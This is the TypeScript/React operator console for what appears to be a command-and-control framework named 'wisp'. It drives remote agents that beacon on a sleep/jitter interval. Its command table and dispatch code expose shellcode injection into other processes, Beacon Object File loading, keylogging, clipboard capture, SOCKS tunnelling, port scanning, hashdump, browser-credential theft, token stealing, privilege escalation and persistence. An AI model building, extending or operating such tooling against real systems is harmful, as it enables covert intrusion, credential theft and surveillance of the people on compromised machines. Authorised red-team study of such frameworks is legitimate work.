import { useMemo, useRef, useState, useEffect, KeyboardEvent } from 'react'
import { useSessionStore, ConsoleEntry, defaultShellForSession } from '../stores/useSessionStore'
import { useT } from '../i18n'
import { ContextMenu, ContextMenuItem } from './ContextMenu'

async function callBackend(method: string, ...args: unknown[]) {
  try {
    const { Call } = await import('@wailsio/runtime')
    return await Call.ByName(method, ...args)
  } catch (e) {
    console.warn('Wails call failed:', method, e)
    return null
  }
}

interface CommandDef {
  cmd: string
  hint: string
  group: string
}

const GROUPS = ['general', 'files', 'system', 'session'] as const

const COMMANDS: CommandDef[] = [
  { cmd: 'shell', hint: 'shell <command>', group: 'general' },
  { cmd: 'ishell', hint: 'ishell [cmd|powershell|bash]', group: 'session' },
  { cmd: 'screenshot', hint: 'capture the screen', group: 'general' },
  { cmd: 'sleep', hint: 'sleep <ms> [jitter]  ms >= 10, jitter 0-100%  例: sleep 5000 10', group: 'session' },
  { cmd: 'exit', hint: 'terminate the agent', group: 'session' },
  { cmd: 'help', hint: 'show command panel', group: 'general' },
  { cmd: 'ls', hint: 'ls [path]', group: 'files' },
  { cmd: 'cd', hint: 'cd <path>', group: 'files' },
  { cmd: 'pwd', hint: 'print working directory', group: 'files' },
  { cmd: 'cat', hint: 'cat <path>', group: 'files' },
  { cmd: 'download', hint: 'download <remote_path>', group: 'files' },
  { cmd: 'upload', hint: 'upload <local_path> <remote_path>', group: 'files' },
  { cmd: 'mkdir', hint: 'mkdir <path>', group: 'files' },
  { cmd: 'rm', hint: 'rm <path>', group: 'files' },
  { cmd: 'ps', hint: 'list processes', group: 'system' },
  { cmd: 'kill', hint: 'kill <pid>', group: 'system' },
  { cmd: 'sysinfo', hint: 'system information', group: 'system' },
  { cmd: 'shellcode', hint: 'shellcode <base64>  run shellcode in-process (call_type: api|syscall|indirect|spoofed)', group: 'loader' },
  { cmd: 'spawn', hint: 'spawn {"shellcode":"<b64>","process":"notepad.exe","method":"apc|remote_thread|fork_and_run|section|phantom"}', group: 'loader' },
  { cmd: 'bof', hint: 'bof {"object":"<b64 .o>","entry":"go","arg":"..."}  run a Beacon Object File', group: 'loader' },
  { cmd: 'portscan', hint: 'portscan {"targets":["10.0.0.1"],"ports":[80,443]}  async scan', group: 'network' },
  { cmd: 'socks', hint: 'socks {"port":1080,"user":"","pass":""}  SOCKS5 proxy', group: 'network' },
  { cmd: 'portfwd', hint: 'portfwd {"lport":8080,"rhost":"10.0.0.5","rport":80}  forward', group: 'network' },
  { cmd: 'netenum', hint: 'netenum {"hosts":["host1"]}  resolve hosts', group: 'network' },
  { cmd: 'keylog', hint: 'keylog {"interval_ms":100}  capture keys (Windows)', group: 'session' },
  { cmd: 'clipboard', hint: 'read clipboard text (Windows)', group: 'session' },
  { cmd: 'jobs', hint: 'list async jobs', group: 'session' },
  { cmd: 'job-kill', hint: 'job-kill {"id":"job-..."}  stop a job', group: 'session' },
]

// Max rendered output lines to keep the DOM light
const MAX_OUTPUT_LINES = 5000

// Stable references so zustand selectors never return new snapshots
const EMPTY_ENTRIES: ConsoleEntry[] = []
const EMPTY_HISTORY: string[] = []
const EMPTY = ''

export function Console() {
  const t = useT()
  const sessions = useSessionStore(s => s.sessions)
  const selectedId = useSessionStore(s => s.selectedId)
  const consoleEntries = useSessionStore(s => (selectedId ? s.console[selectedId] || EMPTY_ENTRIES : EMPTY_ENTRIES))
  const history = useSessionStore(s => (selectedId ? s.consoleHistory[selectedId] || EMPTY_HISTORY : EMPTY_HISTORY))
  const draft = useSessionStore(s => (selectedId ? s.consoleDraft[selectedId] || EMPTY : EMPTY))
  const ishellName = useSessionStore(s => (selectedId ? s.ishell[selectedId] || null : null))

  const [input, setInput] = useState(draft)
  const [historyIdx, setHistoryIdx] = useState(-1)
  const [menu, setMenu] = useState<{ x: number; y: number; items: ContextMenuItem[] } | null>(null)
  const [acIndex, setAcIndex] = useState(-1)
  const [searchOpen, setSearchOpen] = useState(false)
  const [searchQuery, setSearchQuery] = useState('')
  const [searchIdx, setSearchIdx] = useState(0)
  const [notice, setNotice] = useState('')
  const [showHelp, setShowHelp] = useState(false)
  const [historySearchOpen, setHistorySearchOpen] = useState(false)
  const [historyQuery, setHistoryQuery] = useState('')
  const [historySel, setHistorySel] = useState(-1)
  // Pending indicator: shown right after a command is sent, hidden when the
  // agent's response (output/error) arrives. Agents poll on a sleep interval,
  // so results can take a while — a blank console in between feels broken.
  const [pending, setPending] = useState<{ cmd: string; at: number } | null>(null)
  const outputCountRef = useRef(0)
  // Shared with the live-event handler: triggers an immediate DB reload.
  const loadLogsRef = useRef<() => void>(() => {})

  const outputRef = useRef<HTMLDivElement>(null)
  const inputRef = useRef<HTMLInputElement>(null)
  const searchRef = useRef<HTMLInputElement>(null)
  const histSearchRef = useRef<HTMLInputElement>(null)

  const selectedSession = sessions.find(s => s.id === selectedId) || null

  // Load persisted console history when switching sessions
  useEffect(() => {
    if (!selectedId) return
    let cancelled = false
    const load = async () => {
      const logs = await callBackend('github.com/user/wisp/services.SessionService.GetConsoleLogs', selectedId, 500)
      if (cancelled || !Array.isArray(logs)) return
      const entries: ConsoleEntry[] = logs.map((l: { type?: string; content?: string; timestamp?: string }) => ({
        type: l.type === 'input' ? 'input' : 'output',
        content: l.content || '',
        timestamp: l.timestamp ? new Date(l.timestamp).toLocaleTimeString() : '',
      }))
      useSessionStore.setState(s => ({
        console: { ...s.console, [selectedId]: entries },
      }))
    }
    loadLogsRef.current = load
    load()
    const id = setInterval(load, 2000)
    return () => {
      cancelled = true
      clearInterval(id)
    }
  }, [selectedId])

  useEffect(() => {
    setInput(draft)
  }, [selectedId])

  useEffect(() => {
    if (outputRef.current) {
      outputRef.current.scrollTop = outputRef.current.scrollHeight
    }
  }, [consoleEntries.length])

  useEffect(() => {
    if (searchOpen) searchRef.current?.focus()
  }, [searchOpen])

  useEffect(() => {
    if (historySearchOpen) histSearchRef.current?.focus()
    setHistorySel(-1)
  }, [historySearchOpen])

  // Live events only trigger an immediate reload of the authoritative DB log
  // (the poll above always wins; this makes results appear without waiting for
  // the 2s tick). Kept separate so an unreliable event bridge cannot leave the
  // console stuck on the waiting indicator.
  useEffect(() => {
    if (!selectedId) return
    let offOut: (() => void) | null = null
    let offIn: (() => void) | null = null
    let cancelled = false
    const init = async () => {
      const runtime = await import('@wailsio/runtime')
      offOut = runtime.Events.On('session:output', (event: any) => {
        if (cancelled) return
        const data = Array.isArray(event?.data) ? event.data[0] : event?.data
        if (!data || data.session_id !== selectedId) return
        loadLogsRef.current()
      })
      offIn = runtime.Events.On('session:input', (event: any) => {
        if (cancelled) return
        const data = Array.isArray(event?.data) ? event.data[0] : event?.data
        if (!data || data.session_id !== selectedId) return
        loadLogsRef.current()
      })
    }
    init()
    return () => {
      cancelled = true
      if (offOut) offOut()
      if (offIn) offIn()
    }
  }, [selectedId])

  // Track how many output/error entries exist; when a new one arrives the
  // pending indicator is cleared.
  useEffect(() => {
    let n = 0
    for (const e of consoleEntries) {
      if (e.type === 'output' || e.type === 'error') n++
    }
    if (n > outputCountRef.current) setPending(null)
    outputCountRef.current = n
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [consoleEntries])

  // Pending timeout: if no response arrives within 30s, replace the waiting
  // bar with a concrete "no response" result in the output so it never hangs
  // forever (no banner — the operator prefers in-line results).
  useEffect(() => {
    if (!pending) return
    const cmd = pending.cmd
    const id = setTimeout(() => {
      setPending(null)
      if (selectedId) {
        useSessionStore.getState().addConsoleEntry(selectedId, {
          type: 'error',
          content: t('consoleCmdNoResponse') + ': ' + cmd,
          timestamp: new Date().toLocaleTimeString(),
        })
      }
    }, 30000)
    return () => clearTimeout(id)
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [pending])

  // Command completion candidates for the current input
  const candidates = useMemo(() => {
    if (ishellName) return []
    if (!input.trim()) return []
    const parts = input.trim().split(/\s+/)
    const token = parts[parts.length - 1]
    return COMMANDS.filter(c => c.cmd.startsWith(token) && parts.length === 1)
  }, [input])

  const visibleEntries = useMemo(() => consoleEntries.slice(-MAX_OUTPUT_LINES), [consoleEntries])

  // Filtered history for Ctrl+R search
  const historyMatches = useMemo(() => {
    if (!historyQuery) return history
    const q = historyQuery.toLowerCase()
    return history.filter(h => h.toLowerCase().includes(q))
  }, [history, historyQuery])

  // ---- Search (Ctrl+F): find all matches, highlight, prev/next ----
  const matches = useMemo(() => {
    if (!searchQuery) return []
    const q = searchQuery.toLowerCase()
    const found: number[] = []
    visibleEntries.forEach((e, i) => {
      if (e.content.toLowerCase().includes(q)) found.push(i)
    })
    return found
  }, [visibleEntries, searchQuery])

  useEffect(() => {
    setSearchIdx(0)
  }, [searchQuery])

  const scrollToMatch = (entryIdx: number) => {
    if (outputRef.current) {
      const el = outputRef.current.querySelector(`[data-line="${entryIdx}"]`)
      el?.scrollIntoView({ block: 'center' })
    }
  }

  const pollTask = async (taskID: string, timeoutMs = 30000) => {
    const start = Date.now()
    while (Date.now() - start < timeoutMs) {
      const task = await callBackend('github.com/user/wisp/services.SessionService.GetTask', taskID)
      if (task && task.status !== 'pending' && task.status !== 'sent') return task
      await new Promise(r => setTimeout(r, 400))
    }
    return null
  }

  const takeScreenshot = async (sid: string) => {
    const entry = (type: 'info' | 'error', content: string) =>
      useSessionStore.getState().addConsoleEntry(sid, { type, content, timestamp: new Date().toLocaleTimeString() })
    entry('info', 'Capturing screenshot…')
    try {
      const taskID = await callBackend('github.com/user/wisp/services.SessionService.TakeScreenshot', sid)
      const task = await pollTask(taskID)
      if (!task) {
        entry('error', 'Screenshot timed out')
        return
      }
      const res = await callBackend('github.com/user/wisp/services.SessionService.GetScreenshot', taskID)
      if (res?.status === 'completed') {
        entry('info', `Screenshot saved: ${res.path} (${res.w}×${res.h})`)
      } else {
        entry('error', `Screenshot failed: ${res?.path || res?.status || 'unknown'}`)
      }
    } catch (e) {
      entry('error', 'Screenshot error: ' + String(e))
    }
  }

  // ---- Submit ----
  const handleSubmit = () => {
    if (!input.trim()) return

    const parts = input.trim().split(/\s+/)
    const cmd = parts[0]
    const args = parts.slice(1).join(' ')

    const enteringShell = cmd === 'shell' && /^[0-9a-f]{16}$/i.test(args.trim())

    // Run a backend call and surface any rejection (e.g. "unknown command")
    // immediately: clear the waiting bar and print an error line in the output
    // so the operator always gets a concrete result.
    const run = (p: Promise<any>) => {
      if (!selectedId) return
      p.catch((err) => {
        setPending(null)
        const msg = 'Error: ' + String(err)
        useSessionStore.getState().addConsoleEntry(selectedId, {
          type: 'error',
          content: msg,
          timestamp: new Date().toLocaleTimeString(),
        })
      })
    }

    if (cmd === 'shell' && enteringShell) {
      const sid = args.trim()
      useSessionStore.setState({ selectedId: sid })
      setNotice('')
      const def = defaultShellForSession(sid)
      run(callBackend('github.com/user/wisp/services.SessionService.IshellOpen', sid, def))
      useSessionStore.getState().setIshell(sid, def)
    } else if (!selectedId) {
      setNotice(t('consoleNoAgent'))
    } else if (ishellName) {
      if (cmd === 'exit' || cmd === 'ishell') {
        run(callBackend('github.com/user/wisp/services.SessionService.IshellClose', selectedId))
        useSessionStore.getState().setIshell(selectedId, null)
      } else {
        run(callBackend('github.com/user/wisp/services.SessionService.IshellRun', selectedId, input.trim()))
      }
    } else if (cmd === 'ishell') {
      if (args === 'exit' || args === 'close') {
        run(callBackend('github.com/user/wisp/services.SessionService.IshellClose', selectedId))
      } else {
        const shell = args || defaultShellForSession(selectedId)
        run(callBackend('github.com/user/wisp/services.SessionService.IshellOpen', selectedId, shell))
        useSessionStore.getState().setIshell(selectedId, shell)
      }
    } else if (cmd === 'screenshot') {
      takeScreenshot(selectedId)
    } else if (cmd === 'download') {
      const name = args.split(/[\\/]/).pop() || 'download.bin'
      run(callBackend('github.com/user/wisp/services.SessionService.DownloadFile', selectedId, args, `downloads/${name}`))
    } else if (cmd === 'upload') {
      const [localPath, remotePath] = args.split(/\s+/)
      if (localPath && remotePath) {
        run(callBackend('github.com/user/wisp/services.SessionService.UploadFile', selectedId, localPath, remotePath))
      } else {
        useSessionStore.getState().addConsoleEntry(selectedId, {
          type: 'error',
          content: 'Usage: upload <local_path> <remote_path>',
          timestamp: new Date().toLocaleTimeString(),
        })
      }
    } else if (cmd === 'help') {
      setShowHelp(true)
    } else {
      let argsJSON = ''
      switch (cmd) {
        case 'shell': argsJSON = JSON.stringify({ cmd: args }); break
        case 'ls': argsJSON = args ? JSON.stringify({ path: args }) : ''; break
        case 'cd': argsJSON = JSON.stringify({ path: args }); break
        case 'cat': argsJSON = JSON.stringify({ path: args }); break
        case 'kill': argsJSON = JSON.stringify({ pid: args }); break
        case 'sleep': {
          // Accept both `sleep <ms> [jitter]` and `sleep {"sleep":"<ms>","jitter":"<%>"}`.
          // JSON input is common when copying payload-style args; before, the
          // whole JSON object was treated as the sleep value and parsing silently
          // failed, leaving the agent on its default interval.
          let sleepVal = '0'
          let jitterVal = '0'
          const trimmed = args.trim()
          if (trimmed.startsWith('{')) {
            try {
              const obj = JSON.parse(trimmed)
              sleepVal = String(obj.sleep ?? '0')
              jitterVal = String(obj.jitter ?? '0')
            } catch { /* fall through to 0 defaults */ }
          } else {
            const sp = trimmed.split(/\s+/)
            sleepVal = sp[0] || '0'
            jitterVal = sp[1] || '0'
          }
          argsJSON = JSON.stringify({ sleep: sleepVal, jitter: jitterVal })
          break
        }
        // Commands that consume a raw JSON object (or base64) argument must be
        // forwarded verbatim — wrapping in {cmd:..} would break their parsers.
        case 'portscan':
        case 'socks':
        case 'portfwd':
        case 'keylog':
        case 'shellcode':
        case 'spawn':
        case 'bof':
        case 'jobs':
        case 'job-kill':
        case 'clipboard':
        case 'netenum':
        case 'token-steal':
        case 'token-revert':
        case 'hashdump':
        case 'browser-creds':
        case 'persist':
        case 'getsystem':
          argsJSON = args.trim()
          break
        default: argsJSON = args ? JSON.stringify({ cmd: args }) : ''
      }
      run(callBackend('github.com/user/wisp/services.SessionService.SendCommand', selectedId, cmd, argsJSON))
    }

    if (selectedId) {
      useSessionStore.getState().pushHistory(selectedId, input)
      useSessionStore.getState().setDraft(selectedId, '')
      // Local echo so the command appears immediately (the DB log poll
      // confirms/refines it shortly after).
      useSessionStore.getState().addConsoleEntry(selectedId, {
        type: 'input',
        content: input,
        timestamp: new Date().toLocaleTimeString(),
      })
      // Show the waiting indicator until the agent's response arrives.
      // Screenshot has its own progress message; help is local.
      if (!enteringShell && cmd !== 'help' && cmd !== 'screenshot') {
        setPending({ cmd: input.trim(), at: Date.now() })
      }
    }
    setHistoryIdx(-1)
    setInput('')
  }

  // ---- Key handling ----
  const handleKeyDown = (e: KeyboardEvent<HTMLInputElement>) => {
    if (e.ctrlKey && e.key.toLowerCase() === 'f') {
      e.preventDefault()
      setSearchOpen(true)
      return
    }
    if (e.ctrlKey && e.key.toLowerCase() === 'l') {
      e.preventDefault()
      useSessionStore.getState().clearConsole(selectedId || '')
      return
    }
    if (e.ctrlKey && e.key.toLowerCase() === 'k') {
      e.preventDefault()
      inputRef.current?.focus()
      return
    }
    if (e.ctrlKey && e.key.toLowerCase() === 'r') {
      e.preventDefault()
      if (history.length > 0) setHistorySearchOpen(true)
      return
    }

    if (e.key === 'Enter') {
      if (acIndex >= 0 && candidates[acIndex]) {
        e.preventDefault()
        setInput(candidates[acIndex].cmd)
        setAcIndex(-1)
        return
      }
      handleSubmit()
      return
    }

    if (e.key === 'Tab') {
      e.preventDefault()
      if (candidates.length === 1) {
        setInput(candidates[0].cmd + ' ')
        setAcIndex(-1)
      } else if (candidates.length > 1) {
        setAcIndex(prev => (prev + 1) % candidates.length)
      }
      return
    }

    if (e.key === 'ArrowUp') {
      if (candidates.length > 0 && acIndex >= 0) {
        e.preventDefault()
        setAcIndex(prev => (prev - 1 + candidates.length) % candidates.length)
        return
      }
      e.preventDefault()
      if (history.length > 0) {
        const newIdx = historyIdx < history.length - 1 ? historyIdx + 1 : historyIdx
        setHistoryIdx(newIdx)
        setInput(history[history.length - 1 - newIdx])
      }
      return
    }
    if (e.key === 'ArrowDown') {
      if (candidates.length > 0 && acIndex >= 0) {
        e.preventDefault()
        setAcIndex(prev => (prev + 1) % candidates.length)
        return
      }
      e.preventDefault()
      if (historyIdx > 0) {
        setHistoryIdx(historyIdx - 1)
        setInput(history[history.length - 1 - (historyIdx - 1)])
      } else {
        setHistoryIdx(-1)
        setInput(draft)
      }
    }
  }

  // ---- History search key handling ----
  const handleHistoryKey = (e: KeyboardEvent<HTMLInputElement>) => {
    if (e.key === 'Escape') {
      setHistorySearchOpen(false)
      setHistoryQuery('')
      return
    }
    if (e.key === 'ArrowUp' || e.key === 'ArrowDown') {
      e.preventDefault()
      if (historyMatches.length === 0) return
      const dir = e.key === 'ArrowUp' ? -1 : 1
      setHistorySel(prev => {
        const next = (prev + dir + historyMatches.length) % historyMatches.length
        return next
      })
      return
    }
    if (e.key === 'Enter') {
      e.preventDefault()
      const item = historyMatches[historySel >= 0 ? historySel : historyMatches.length - 1]
      if (item) {
        setInput(item)
        setHistorySearchOpen(false)
        setHistoryQuery('')
        inputRef.current?.focus()
      }
    }
  }

  const clearConsole = () => {
    useSessionStore.getState().clearConsole(selectedId || '')
  }

  const openIshell = () => {
    if (!selectedId) return
    const shell = defaultShellForSession(selectedId)
    callBackend('github.com/user/wisp/services.SessionService.IshellOpen', selectedId, shell)
    useSessionStore.getState().setIshell(selectedId, shell)
  }

  const switchSession = (id: string) => {
    useSessionStore.setState({ selectedId: id })
    setNotice('')
  }

  const renderContent = (entry: ConsoleEntry) => {
    let text = entry.content
    let node = <span>{text}</span>
    if (searchQuery) {
      const parts = text.split(new RegExp(`(${escapeRegExp(searchQuery)})`, 'ig'))
      node = (
        <span>
          {parts.map((p, i) =>
            p.toLowerCase() === searchQuery.toLowerCase()
              ? <mark key={i} className="console-mark">{p}</mark>
              : <span key={i}>{p}</span>,
          )}
        </span>
      )
    }
    if (entry.type === 'input') {
      return <><span className="prompt">wisp &gt; </span>{node}</>
    }
    if (entry.type === 'error') return <span className="error">{node}</span>
    if (entry.type === 'info') return <span className="info">{node}</span>
    return <span className="output">{node}</span>
  }

  const copyAll = async () => {
    const text = consoleEntries.map(e => `[${e.timestamp}] ${e.content}`).join('\n')
    try {
      await navigator.clipboard.writeText(text)
    } catch { /* unavailable */ }
  }

  const copyLine = async (content: string) => {
    try {
      await navigator.clipboard.writeText(content)
    } catch { /* unavailable */ }
  }

  const groupLabel = (g: string) => {
    const map: Record<string, string> = {
      general: t('consoleGroupGeneral'),
      files: t('consoleGroupFiles'),
      system: t('consoleGroupSystem'),
      session: t('consoleGroupSession'),
    }
    return map[g] || g
  }

  // Focus the input on click, but never steal focus while the user is selecting
  // text — focusing an <input> clears the current selection in WebView2.
  const handleWrapperClick = () => {
    const sel = window.getSelection()
    if (sel && sel.toString()) return
    inputRef.current?.focus()
  }

  return (
    <div className="console-wrapper" onClick={handleWrapperClick}>
      {/* Header: session picker + quick actions */}
      <div className="console-header" onClick={e => e.stopPropagation()}>
        <select
          className="console-session-select"
          value={selectedId || ''}
          onChange={e => switchSession(e.target.value)}
          title={t('consoleSelectSession')}
        >
          <option value="" disabled>{t('consoleSelectSession')}</option>
          {sessions.map(s => (
            <option key={s.id} value={s.id}>
              {s.hostname || s.id} ({s.id.slice(0, 8)}…) · {s.status}
            </option>
          ))}
        </select>
        {selectedSession && (
          <span className={`console-session-status ${selectedSession.status}`}>
            <span className="status-dot" />
            {selectedSession.status}
          </span>
        )}
        {ishellName && <span className="console-ishell-badge">ishell[{ishellName}]</span>}
        <div className="spacer" />
        <button className="toolbar-btn" onClick={openIshell} disabled={!selectedId} title="Open interactive shell">
          Shell
        </button>
        <button className="toolbar-btn" onClick={() => selectedId && takeScreenshot(selectedId)} disabled={!selectedId} title={t('menuScreenshot')}>
          Screenshot
        </button>
        <button className="toolbar-btn" onClick={clearConsole} title={t('consoleClear')}>Clear</button>
        <button className={`toolbar-btn${showHelp ? ' primary' : ''}`} onClick={() => setShowHelp(v => !v)} title={t('consoleHelp')}>Help</button>
      </div>

      {notice && <div className="console-notice">{notice}</div>}

      <div
        className="console-output"
        ref={outputRef}
        onContextMenu={e => {
          e.preventDefault()
          e.stopPropagation()
          setMenu({
            x: e.clientX,
            y: e.clientY,
            items: [
              { label: t('consoleCopyAll'), onClick: copyAll },
              { label: t('consoleClear'), onClick: clearConsole },
              { label: t('consoleSearch'), onClick: () => setSearchOpen(true) },
              { separator: true },
              { label: 'Insert: sysinfo', onClick: () => setInput('sysinfo') },
              { label: 'Insert: ps', onClick: () => setInput('ps') },
              { label: 'Insert: ls', onClick: () => setInput('ls') },
            ],
          })
        }}
      >
        {sessions.length === 0 && (
          <div className="console-empty-hint">
            <div className="console-empty-title">{t('consoleEmptyTitle')}</div>
            <div>{t('consoleEmptyHint1')}</div>
            <div>{t('consoleEmptyHint2')}</div>
          </div>
        )}
        {!selectedId && sessions.length > 0 && (
          <div className="console-empty-hint console-empty-guide">
            <div className="console-empty-title">{t('consoleSelectFirst')}</div>
            <div>{t('consoleSelectHint1')}</div>
            <div>{t('consoleSelectHint2')}</div>
          </div>
        )}
        {visibleEntries.map((entry, i) => (
          <div
            key={i}
            data-line={i}
            className={`console-line${matches.includes(i) ? ' match' : ''}`}
            onDoubleClick={() => copyLine(entry.content)}
            title={t('consoleCopyLine')}
          >
            <span className="time">[{entry.timestamp}]</span>
            {renderContent(entry)}
          </div>
        ))}
        {pending && (
          <div className="console-pending">
            <span className="console-pending-dot" />
            {t('consoleWaiting')} <span className="mono">{pending.cmd}</span>
            {Date.now() - pending.at > 60000 && <span className="console-pending-warn">{t('consoleWaitingTimeout')}</span>}
          </div>
        )}
      </div>

      {/* Help / command panel */}
      {showHelp && (
        <div className="console-help" onClick={e => e.stopPropagation()}>
          <div className="console-help-title">{t('consoleHelp')}</div>
          <div className="console-help-body">
            {GROUPS.map(g => (
              <div key={g} className="console-help-group">
                <div className="console-help-group-label">{groupLabel(g)}</div>
                {COMMANDS.filter(c => c.group === g).map(c => (
                  <button
                    key={c.cmd}
                    className="console-help-item"
                    onClick={() => { setInput(c.cmd + ' '); inputRef.current?.focus() }}
                  >
                    <span className="console-help-cmd">{c.cmd}</span>
                    <span className="console-help-hint">{c.hint}</span>
                  </button>
                ))}
              </div>
            ))}
          </div>
          <button className="toolbar-btn" onClick={() => setShowHelp(false)} style={{ alignSelf: 'flex-end' }}>✕</button>
        </div>
      )}

      {/* History search bar (Ctrl+R) */}
      {historySearchOpen && (
        <div className="console-search console-history-search" onClick={e => e.stopPropagation()}>
          <span className="console-search-label">(reverse-i-search)`{historyQuery}':</span>
          <input
            ref={histSearchRef}
            value={historyQuery}
            onChange={e => { setHistoryQuery(e.target.value); setHistorySel(-1) }}
            onKeyDown={handleHistoryKey}
            placeholder={t('consoleHistorySearch')}
          />
          {historyMatches.length > 0 && (
            <span className="console-search-match">
              {historyMatches[historySel >= 0 ? historySel : historyMatches.length - 1]}
            </span>
          )}
          <button className="toolbar-btn" onClick={() => { setHistorySearchOpen(false); setHistoryQuery('') }}>✕</button>
        </div>
      )}

      {searchOpen && (
        <div className="console-search" onClick={e => e.stopPropagation()}>
          <input
            ref={searchRef}
            value={searchQuery}
            onChange={e => setSearchQuery(e.target.value)}
            onKeyDown={e => {
              if (e.key === 'Enter') {
                e.preventDefault()
                if (matches.length > 0) {
                  const next = (searchIdx + (e.shiftKey ? -1 : 1) + matches.length) % matches.length
                  setSearchIdx(next)
                  scrollToMatch(matches[next])
                }
              }
            }}
            placeholder={t('consoleSearchPlaceholder')}
          />
          <span className="console-search-count">{matches.length > 0 ? `${searchIdx + 1} / ${matches.length}` : '0'}</span>
          <button className="toolbar-btn" onClick={() => {
            if (matches.length > 0) {
              const next = (searchIdx + 1) % matches.length
              setSearchIdx(next)
              scrollToMatch(matches[next])
            }
          }}>↓</button>
          <button className="toolbar-btn" onClick={() => {
            if (matches.length > 0) {
              const next = (searchIdx - 1 + matches.length) % matches.length
              setSearchIdx(next)
              scrollToMatch(matches[next])
            }
          }}>↑</button>
          <button className="toolbar-btn" onClick={() => { setSearchOpen(false); setSearchQuery('') }}>✕</button>
        </div>
      )}

      <div className="console-input">
        <span className={`prompt-symbol${ishellName ? ' ishell' : ''}`}>
          {ishellName ? `ishell[${ishellName}]# ` : 'wisp >'}
        </span>
        <input
          ref={inputRef}
          value={input}
          onChange={e => {
            setInput(e.target.value)
            setAcIndex(-1)
            if (selectedId) useSessionStore.getState().setDraft(selectedId, e.target.value)
          }}
          onKeyDown={handleKeyDown}
          placeholder={ishellName ? t('consoleIshellPlaceholder').replace('{shell}', ishellName) : t('consolePlaceholder')}
          autoFocus
        />
      </div>

      {candidates.length > 0 && (
        <div className="console-ac">
          {candidates.map((c, i) => (
            <div
              key={c.cmd}
              className={`console-ac-item${i === acIndex ? ' active' : ''}`}
              onMouseDown={e => { e.preventDefault(); setInput(c.cmd + ' '); setAcIndex(-1) }}
            >
              <span className="console-ac-cmd">{c.cmd}</span>
              <span className="console-ac-hint">{c.hint}</span>
            </div>
          ))}
        </div>
      )}

      {menu && <ContextMenu x={menu.x} y={menu.y} items={menu.items} onClose={() => setMenu(null)} />}
    </div>
  )
}

function escapeRegExp(s: string): string {
  return s.replace(/[.*+?^${}()|[\]\\]/g, '\\$&')
}
